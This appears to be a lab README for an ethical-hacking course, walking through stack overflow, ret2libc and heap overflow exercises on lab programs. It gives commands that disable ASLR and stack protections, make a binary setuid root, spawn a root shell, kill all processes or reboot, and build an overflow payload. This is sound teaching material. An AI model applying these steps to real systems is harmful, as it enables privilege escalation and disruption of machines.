# Ethical hacking - Buffer Overflow Exploit

## What is Stack guard? What is ASLR protection?

Stack guard protection is any of various techniques used during software development to enhance the security of executable programs by detecting buffer overflows on stack-allocated variables, and preventing them from causing program misbehavior or from becoming serious security vulnerabilities. It is basically used to prevent stack smashing.

Address space layout randomization (ASLR) is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.

### Perform a stack overflow attack on the stack.c and launch shell as root under when Stack is executable stack and ASLR is turned off

`sudo sysctl -w kernel.randomize_va_space=0`

`sudo gcc -g stack.c -o stack -fno-stack-protector -z execstack`

`sudo chown root:root stack`

`sudo chmod 4755 stack`

`gcc exploit.c -o exp`

`./exp shell`

`./stack`

### Perform a stack overflow attack on the stack.c and launch shell as root and perform seteuid() under when Stack is executable stack and ASLR is turned off

`./exp shell`

`./stack`

### Perform a stack overflow attack on the stack.c and kill all processes when Stack is executable stack and ASLR is turned off

`./exp kill`

`./stack`

### Perform a stack overflow attack on the stack.c and reboot the system when Stack is executable stack and ASLR is turned off

`./exp restart`

`./stack`

### Now turn on ASLR and perform all the previous tasks

We enable the ASLR using this command: `sudo sysctl -w kernel.randomize_va_space=2`

In a BASH script, we call the program in an infinite loop: `sh -c "while [ 1 ]; do ./stack; done;"`

### Turn on a non-executable stack . Perform any ret2libc attack

`sudo gcc stack.c -o stack -fno-stack-protector -z noexecstack`

Then, start GDB with:

`gdb stack`

Type the commands:

`b main`

`r`

`p system` (Note the address)

`p exit` (Note the address)

Run `exploit_retlib.c` to get the addresses for the two components and `getenv.c` to get address for `/bin/sh`.

Add the addresses to the pointers in `exploit_retlib.c`

Then run the code:

`gcc -o exploit exploit_retlib.c`

`./exploit`

`./stack`

### Exploit heap1.c and try to execute executeShell function to launch a shell

`gcc -o heap heap1.c`

In GDB, we set a breakpoint at main and execute the following commmands

`b main`

`r`

`info proc map` (Note the heap address)

`x/50x <heap_address>`

We determine that we need to enter 72 bytes garbage value followed by `executeShell()` address.

`print &executeShell` (Note the address)

`$(python -c "print 'A'*72 + '<hex-address in reverse order>'")`

### Exploit heap2.c and try to execute executeShell function to launch a shell

`gcc -o heap heap2.c`

`print &executeShell` (Note the address)

Get shellcode for assembly code:

`push <address>`

`ret`

Add address to line 28 of `heapBreak.py` and execute script

`./heap $(cat tmpA) $(cat tmpB) $(cat tmp/C)`
